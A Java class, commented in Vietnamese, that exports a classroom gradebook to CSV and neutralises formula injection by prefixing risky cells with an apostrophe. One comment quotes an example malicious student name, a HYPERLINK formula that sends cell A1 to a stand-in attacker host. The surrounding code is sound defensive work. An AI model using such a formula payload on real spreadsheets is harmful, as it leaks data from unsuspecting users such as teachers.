package com.datn.quizai.classroom.service;

import com.datn.quizai.classroom.dto.AssignmentResultRow;
import com.datn.quizai.classroom.dto.AssignmentResultsResponse;

import java.time.format.DateTimeFormatter;
import java.util.List;

/**
 * Dựng bảng điểm lớp ở dạng CSV (features/14, FR-58).
 * <p>
 * Lớp thuần, không Spring: đây là phần có ba luật dễ sai và cả ba đều <b>hỏng lặng lẽ</b> — file vẫn tải
 * về được, vẫn mở được, chỉ là nội dung sai. Nên nó phải kiểm được bằng unit test.
 *
 * <h3>Vì sao chỉ làm CSV, không làm PDF</h3>
 * Đặc tả xếp FR-58 mức {@code [C]}. CSV không cần thêm gì vào stack; PDF cần một thư viện mới cho đúng một
 * tính năng, <b>và</b> phải nhúng font tiếng Việt — thiếu font thì chữ ra ô vuông, một lỗi chỉ phát hiện khi
 * ai đó mở file. Giáo viên cần bảng điểm để <i>tính toán tiếp</i> (nhập vào sổ, cộng trung bình), mà việc đó
 * hợp với bảng tính hơn hẳn với PDF.
 */
public final class BangDiemCsvWriter {

    /**
     * Dấu hiệu đầu tệp UTF-8.
     *
     * <h4>Không có nó thì Excel trên Windows mở ra tiếng Việt lỗi hết</h4>
     * Excel không tự đoán UTF-8 cho tệp {@code .csv}: nó dùng bảng mã hệ thống, nên "Nguyễn Văn An" thành
     * "Nguyá»…n VÄƒn An". Đây đúng loại lỗi lặng lẽ như font PDF — server trả 200, file tải về được, và chỉ
     * người mở mới thấy sai. Ba byte này là toàn bộ khác biệt.
     */
    private static final String BOM = "﻿";

    /** Ngày giờ theo kiểu Việt Nam để giáo viên đọc thẳng, không phải ISO cho máy đọc. */
    private static final DateTimeFormatter DINH_DANG_NGAY =
            DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm");

    private BangDiemCsvWriter() {
    }

    public static String dung(AssignmentResultsResponse ketQua) {
        StringBuilder sb = new StringBuilder(BOM);

        // Dòng đầu ghi bối cảnh: một file tên "bang-diem.csv" nằm trong thư mục Tải về sau hai tuần thì
        // không còn ai nhớ nó của lớp nào, bài nào.
        sb.append(dong("Lớp", ketQua.baiTap().tenLop()));
        sb.append(dong("Bài tập", ketQua.baiTap().title()));
        sb.append(dong("Quiz", ketQua.baiTap().quizTitle()));
        sb.append(dong("Hạn nộp", ketQua.baiTap().dueAt() == null
                ? "Không có hạn"
                : ketQua.baiTap().dueAt().format(DINH_DANG_NGAY)));
        sb.append('\n');

        sb.append(String.join(",",
                "Họ tên", "Trạng thái", "Điểm", "Điểm tối đa", "Nộp lúc")).append('\n');

        for (AssignmentResultRow row : ketQua.danhSach()) {
            sb.append(String.join(",",
                    oAnToan(row.tenHocSinh()),
                    oAnToan(row.trangThaiNhan()),
                    // Ô TRỐNG chứ không phải 0: người chưa nộp mà ghi 0 là nói sai về họ, và mọi phép tính
                    // trung bình trên cột này sẽ sai theo. Cùng lý do với `diem = null` ở API.
                    row.diem() == null ? "" : String.valueOf(row.diem()),
                    row.diemToiDa() == null ? "" : String.valueOf(row.diemToiDa()),
                    row.nopLuc() == null ? "" : row.nopLuc().format(DINH_DANG_NGAY)))
                    .append('\n');
        }
        return sb.toString();
    }

    private static String dong(String nhan, String giaTri) {
        return oAnToan(nhan) + "," + oAnToan(giaTri) + "\n";
    }

    /**
     * Bọc một ô cho an toàn: chống cả lỗi định dạng lẫn <b>tiêm công thức</b>.
     *
     * <h4>Tiêm công thức là lỗ hổng thật, không phải chuyện lý thuyết</h4>
     * Tên hiển thị do người dùng tự đặt. Một học sinh đặt tên là
     * {@code =HYPERLINK("http://kẻ-xấu/?d="&A1,"Bấm vào đây")} thì khi giáo viên mở file bằng Excel, ô đó
     * <b>chạy</b> — Excel coi mọi ô bắt đầu bằng {@code = + - @} là công thức. Nạn nhân là giáo viên, tức
     * người không làm gì sai cả.
     * <p>
     * Cách chặn: thêm một dấu nháy đơn đứng trước. Excel hiểu đó là "ô này là chữ", hiển thị vẫn đúng tên,
     * nhưng không chạy gì. Bọc trong ngoặc kép thôi thì <b>không đủ</b> — Excel vẫn diễn giải công thức bên
     * trong ngoặc kép.
     */
    static String oAnToan(String giaTri) {
        if (giaTri == null || giaTri.isEmpty()) {
            return "";
        }
        String s = giaTri;
        char dau = s.charAt(0);
        if (dau == '=' || dau == '+' || dau == '-' || dau == '@') {
            s = "'" + s;
        }
        // Nhân đôi dấu nháy kép rồi bọc cả ô: luật thoát của RFC 4180. Bắt buộc khi ô chứa dấu phẩy,
        // nháy kép hoặc xuống dòng — tên người thật có thể chứa cả ba.
        return '"' + s.replace("\"", "\"\"") + '"';
    }

    /** Tên tệp gợi ý cho trình duyệt — bỏ ký tự mà hệ điều hành không cho đặt tên. */
    public static String tenTep(String tenBaiTap) {
        String sach = (tenBaiTap == null || tenBaiTap.isBlank() ? "bang-diem" : tenBaiTap)
                .replaceAll("[\\\\/:*?\"<>|]", "")
                .trim();
        return "bang-diem-" + sach + ".csv";
    }

    /** Dùng ở test để đọc lại phần dữ liệu mà không phải đếm dòng tiêu đề bằng tay. */
    static List<String> cacDong(String csv) {
        return List.of(csv.replace(BOM, "").split("\n"));
    }
}
